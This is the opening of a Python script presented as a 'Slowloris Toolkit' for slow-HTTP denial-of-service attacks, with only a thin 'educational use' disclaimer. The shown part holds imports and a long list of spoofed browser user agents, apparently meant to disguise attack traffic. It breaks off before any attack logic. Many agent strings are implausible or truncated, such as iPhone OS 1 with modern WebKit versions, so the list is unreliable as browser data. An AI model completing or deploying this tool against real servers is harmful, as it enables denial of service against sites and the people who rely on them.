#!/usr/bin/env python3
"""
Slowloris Toolkit
Educational use only - demonstrates slow HTTP connection attack.
Only for testing on your own authorized systems.
"""

import warnings
warnings.filterwarnings('ignore', category=FutureWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)

import socket
import sys
import threading
import time
import random
import ssl
from datetime import datetime
from urllib.parse import urlparse

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:121) Gecko/20100101 Firefox/121",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/17 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537 Edg/119",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/17 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 17 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/17 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:120) Gecko/20100101 Firefox/120",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/16 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537 Edg/117",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/16 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 16 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/16 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:119) Gecko/20100101 Firefox/119",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/15 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537 Edg/115",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 15 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:118) Gecko/20100101 Firefox/118",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/14 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537 Edg/113",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/14 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 14 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/14 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:117) Gecko/20100101 Firefox/117",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/13 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537 Edg/111",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/13 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 13 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/13 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:116) Gecko/20100101 Firefox/116",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/12 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537 Edg/109",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/12 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 12 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/12 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:115) Gecko/20100101 Firefox/115",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/11 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537 Edg/107",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/11 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 11 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/11 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:114) Gecko/20100101 Firefox/114",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/10 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537 Edg/105",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/10 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 10 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/10 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:113) Gecko/20100101 Firefox/113",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/9 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537 Edg/103",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/9 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 9 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/9 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:112) Gecko/20100101 Firefox/112",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/8 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537 Edg/101",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/8 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 8 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/8 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:111) Gecko/20100101 Firefox/111",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/7 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537 Edg/99",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/7 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 7 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/7 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:110) Gecko/20100101 Firefox/110",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/6 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537 Edg/97",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/6 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 6 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/6 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:109) Gecko/20100101 Firefox/109",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/5 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537 Edg/95",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 5 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/5 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 5 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/5 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:108) Gecko/20100101 Firefox/108",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/4 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537 Edg/93",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 4 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/4 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 4 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/4 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:107) Gecko/20100101 Firefox/107",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/3 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537 Edg/91",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 3 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/3 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 3 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/3 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:106) Gecko/20100101 Firefox/106",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/2 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537 Edg/89",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 2 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/2 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 2 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/2 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:105) Gecko/20100101 Firefox/105",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/1 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537 Edg/87",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 1 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/1 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 1 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/1 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:104) Gecko/20100101 Firefox/104",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537 Edg/85",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:103) Gecko/20100101 Firefox/103",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537 Edg/83",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:102) Gecko/20100101 Firefox/102",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537 Edg/81",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:101) Gecko/20100101 Firefox/101",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537 Edg/79",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:100) Gecko/20100101 Firefox/100",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537 Edg/77",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:99) Gecko/20100101 Firefox/99",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537 Edg/75",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:98) Gecko/20100101 Firefox/98",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537 Edg/73",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:97) Gecko/20100101 Firefox/97",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537 Edg/71",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:96) Gecko/20100101 Firefox/96",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537 Edg/69",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:95) Gecko/20100101 Firefox/95",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537 Edg/67",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:94) Gecko/20100101 Firefox/94",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537 Edg/65",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:93) Gecko/20100101 Firefox/93",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537 Edg/63",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:92) Gecko/20100101 Firefox/92",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537 Edg/61",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:91) Gecko/20100101 Firefox/91",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537 Edg/59",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:90) Gecko/20100101 Firefox/90",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537 Edg/57",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:89) Gecko/20100101 Firefox/89",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537 Edg/55",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:88) Gecko/20100101 Firefox/88",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537 Edg/53",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:87) Gecko/20100101 Firefox/87",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
